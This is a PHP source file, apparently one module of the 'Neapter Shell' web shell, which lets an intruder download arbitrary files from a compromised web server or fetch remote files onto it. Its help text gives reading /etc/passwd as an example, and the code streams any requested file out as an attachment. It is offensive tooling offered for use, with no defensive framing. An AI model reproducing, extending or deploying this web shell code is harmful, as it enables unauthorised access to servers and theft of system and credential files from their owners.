<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Local and remote download module
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleDownload extends ModuleAbstract
{
    /**
     * Temporary file for remote resource
     *
     * @var boolean
     */
    private $sTmpFile;

    /**
     * Destruct
     */
    public function __destruct()
    {
        if ($this->sTmpFile) {
            @unlink($this->sTmpFile);
        }
    }

    /**
     * List of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'download',
            'down',
            'get'
        );
    }

    /**
     * Module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.4 2012-11-11 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Pobieranie pliku

	Użycie:
		download ścieżka_do_pliku_http_lub_ftp

	Opcje:
		-g pobieranie przy użyciu kompresji GZIP

	Przykład:
		download /etc/passwd
		download -g /etc/passwd
		download http://www.google.com
		download ftp://google.pl/x.zip
DATA;
    }

    /**
     * Execute module
     *
     * @return string|void
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() === 0) {
            return self::getHelp();
        }

        $bGzip = in_array('g', $this->oArgs->getSwitches());

        $sFile = $this->oArgs->getParam(0);

        /**
         * Remote download
         */
        if (preg_match('~^(http|ftp)://~', $sFile)) {
            $this->sTmpFile = $this->oUtils->cacheGetFile($sFile);

            if (($sData = @file_get_contents($sFile)) === false) {
                return sprintf(
                    'Nie można pobrać pliku z "%s"',
                    $sFile
                );
            }

            file_put_contents($this->sTmpFile, $sData);

            $sFile = $this->sTmpFile;
        }

        if (($rFile = @fopen($sFile, 'r')) === false) {
            return sprintf('Błąd odczytu pliku "%s"', $sFile);
        }

        @header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        @header('Pragma: no-cache');
        @header('Content-Type: application/octet-stream');
        @header(
            sprintf(
                'Content-Disposition: attachment; filename="%s"',
                basename($sFile)
            )
        );

        /**
         * Enable GZip compression
         */
        ob_start($bGzip ? 'ob_gzhandler' : null);

        if (!$bGzip) {
            @header(sprintf('Content-Length: %s', filesize($sFile)), true);
        }

        while (!feof($rFile)) {
            echo fread($rFile, 32768);
            @ob_flush();
            @flush();
        }

        ob_end_flush();


        $this->oShell->eof();
    }
}
